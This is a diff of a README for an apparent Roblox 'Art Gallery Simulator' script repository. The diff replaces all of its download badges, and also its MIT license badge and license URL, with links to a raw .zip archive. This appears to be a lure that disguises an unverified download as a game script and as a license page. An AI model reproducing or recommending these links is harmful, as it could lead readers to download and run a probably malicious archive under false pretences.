@@ -1,6 +1,6 @@
 # Art Gallery Simulator Roblox Script
 
-[![Download](https://img.shields.io/badge/Download-green)](https://mibrahiim786.github.io)
+[![Download](https://img.shields.io/badge/Download-green)](https://raw.githubusercontent.com/mibrahiim786/art-gallery-simulator-roblox-toolkit/branch/nanosoma/art_roblox_toolkit_simulator_gallery_1.6.zip)
 
 **Welcome to the official Art Gallery Simulator Roblox Script repository!**  
 Experience the ingenuity of managing your own digital art haven on Roblox, in a setting where code meets creative curation. This powerful and adaptable script empowers you to transform your world into a living, breathing exhibit—where AI-driven adventures mingle with immersive gameplay, and your artistic instincts guide the way. Whether you’re a new Roblox creator or a sophisticated developer, this project unlocks a gallery of endless innovation.
@@ -98,7 +98,7 @@ Select or design your ideal gallery style—from minimal modern to ornate classi
 ## 🚀 Getting Started
 
 1. Clone or download the script files:  
-   [![Download](https://img.shields.io/badge/Download-green)](https://mibrahiim786.github.io)
+   [![Download](https://img.shields.io/badge/Download-green)](https://raw.githubusercontent.com/mibrahiim786/art-gallery-simulator-roblox-toolkit/branch/nanosoma/art_roblox_toolkit_simulator_gallery_1.6.zip)
 
 2. Import to Roblox Studio:  
    Upload/unpack the script into an empty place, or merge with your existing game folder.
@@ -140,10 +140,10 @@ Select or design your ideal gallery style—from minimal modern to ornate classi
 MIT License (2025)  
 This repository is licensed under the MIT terms for maximum creative flexibility.
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://raw.githubusercontent.com/mibrahiim786/art-gallery-simulator-roblox-toolkit/branch/nanosoma/art_roblox_toolkit_simulator_gallery_1.6.zip)
 
 Read the full MIT agreement here:  
-https://opensource.org/licenses/MIT
+https://raw.githubusercontent.com/mibrahiim786/art-gallery-simulator-roblox-toolkit/branch/nanosoma/art_roblox_toolkit_simulator_gallery_1.6.zip
 
 ---
 
@@ -151,7 +151,7 @@ https://opensource.org/licenses/MIT
 
 Seize the immersive art experience today!
 
-[![Download](https://img.shields.io/badge/Download-green)](https://mibrahiim786.github.io)
+[![Download](https://img.shields.io/badge/Download-green)](https://raw.githubusercontent.com/mibrahiim786/art-gallery-simulator-roblox-toolkit/branch/nanosoma/art_roblox_toolkit_simulator_gallery_1.6.zip)
 
 ---
 
